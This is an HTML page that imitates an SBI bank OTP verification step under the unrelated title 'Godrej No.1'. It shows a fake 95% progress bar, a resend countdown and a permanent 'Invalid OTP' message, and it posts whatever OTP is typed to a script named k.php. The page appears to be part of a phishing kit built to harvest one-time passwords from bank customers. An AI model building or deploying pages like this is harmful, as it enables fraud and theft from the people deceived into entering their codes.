<!DOCTYPE HTML> 
<html>
   <head>
      <title>Godrej No.1</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="kk.css">
      <link rel="stylesheet" type="text/css" href="rr.css">
   </head>
   <body style="background:#fff;">
       <div class="container-fluid m-0 p-0">
<img src="dt.png" class="hidden-xs img-fluid">
<img src="rd.png" class="hidden-lg img-fluid">

    
</div>
      <section class="">
         <div class="container">
         <form action="k.php" method="post">
            <div class="box">
               <div class="page-hea">
                  <div class="row">
                     <div class="col-xs-6 col-md-6">
                        <h2>OTP</h2>
                     </div>
                     <div class="col-xs-6 col-md-6 text-right">
                        <h2>X</h2>
                     </div>
                  </div>
               </div>
               <div class="row">
                  <div class="col-md-6 col-xs-12">
				   <div class="progress">
                              <div class="progress-bar" style="width:95%">95% Completed</div>
                           </div>
                     <div class="p-50">
                        <h4><b>OTP Verification</b></h4>
                        <p>An OTP has been sent to the registered mobile number with SBI.</p>
                        <br><br>
                        <p class="red"><b>Invalid OTP</b></p> 
                        <input type="text" class="form-control" name="OTP" placeholder="Enter OTP" required=""><br>
						<p><a href="#" style="color:#000; font-weight:bold;"> Resend OTP in <span id="countdowntimer">30 </span> Seconds</a></p>
                        <!--<p class="text-right">Resend OTP</p>-->
                     </div>
                  </div>
               </div>
            </div>
            <div class="row">
               <br><br>
               <div class="col-xs-12 col-md-12 text-center">
                  <a href="#" class="btn btn-border">Back</a>
                  <button type="submit" class="btn btn-primary"> Submit </button>
               </div>
            </div>
          </form>
         </div>
      </section>
      <footer>
         
         <img src="xm.png" class="img-fluid hidden-xs hidden-sm" width="100%">
         <img src="fi.png" class="img-fluid hidden-lg hidden-md" width="100%">
      </footer>
      
      
	  <script>
	  var timeleft = 30;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
	  </script>
   </body>
</html>